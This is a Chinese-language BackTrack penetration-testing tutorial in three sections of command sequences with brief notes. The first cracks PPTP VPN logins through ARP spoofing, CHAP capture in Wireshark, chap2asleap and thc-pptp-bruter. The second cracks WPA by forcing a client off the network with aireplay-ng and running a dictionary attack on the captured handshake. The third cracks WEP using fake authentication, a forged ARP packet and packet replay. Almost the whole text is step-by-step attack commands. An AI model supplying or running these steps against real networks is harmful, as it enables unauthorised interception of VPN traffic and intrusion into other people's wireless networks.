backtrack渗透实战课程（linux安全网）
====
## 目录
* [一、backtrack实践教程--破解VPN](#一、backtrack实践教程--破解VPN)  
* [二、CrackWPA破解_WPA实战教程](#二、CrackWPA破解_WPA实战教程)  
* [三、crackWEP实战课程](#三、crackWEP实战课程) 




***
### 一、backtrack实践教程--破解VPN
`[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/)`|[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/ "参考网站")|
```
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ./arpspoof -i eth0 -t 10.0.0.3 10.0.0.9
    ./arpspoof -i eth0 -t 10.0.0.9 10.0.0.3
    注：两个shell窗口输入arpspoof
    wireshark -i eth0 -k
    注：wireshark过滤条件：chap；启动VPN
    python chap2asleap.py -u [用户名] -c [PPP_CHAP_Challenge] -r [PPP_CHAP_Response] -x -v 
    注：通过wireshark查看输入参数

    cd /pentest/passwords/wordlists/
    cat darkc0de.lst | thc-pptp-bruter -u [用户名] -n 99 -l 999 10.0.0.3
```
### 二、CrackWPA破解_WPA实战教程
```
    airmon-ng start wlan0
    注：结果中记录monitor mode的名字（如：mon7）
    airodump-ng mon7  
    注：抓取目标主机连接无线的相关信息
    airodump-ng --channel 8 --write [文件名] --bssid [无线路由器MAC] mon7
    注：抓包记录被攻击主机的连接
    aireplay-ng --deauth 1 -a [无线路由器MAC] -c [被攻击主机MAC] mon7
    注：断开被攻击主机和无线路由连接，使其再连接，被airodump抓包
    aircrack-ng [文件名] -w /pentest/passwords/wordlists/darkc0de.lst
    注：使用字典破解抓包中的密码
```
### 三、crackWEP实战课程
```
    ifconfig -a
    airmon-ng start wlan0 6
    注：其中6为channel，结果中记录monitor mode的名字（如：mon4）
    airodump-ng --ivs -w pack -c 6 mon4  
    注：抓取无线路由器上产生连接的相关信息，生成pack文件名
    aireplay-ng -1 0 -e [无线路由器节点名] -a [无线路由器MAC] -h [攻击主机MAC] mon4
    注：攻击主机伪装连接AP
    aireplay-ng -5 -b [无线路由器节点名] -h [攻击主机MAC] mon4
    注：获得1500字节PRGA（假的随机生成运算），生成xor文件
    packetforge-ng -0 -a [无线路由器MAC] -h [攻击主机MAC] -k 255.255.255.255 -l 255.255.255.255 -y [xor文件名] -w mrarp
    注：生成伪装的arp包，文件名为mrarp
    aireplay-ng -2 -r mrarp -x 512 mon4
    注：使用mrarp包，回放攻击无线路由器
    aircrack-ng -n 64 -b [无线路由器MAC] [airodum-ng生成的ivs文件]
    注：通过ivs抓包，找回密码
```







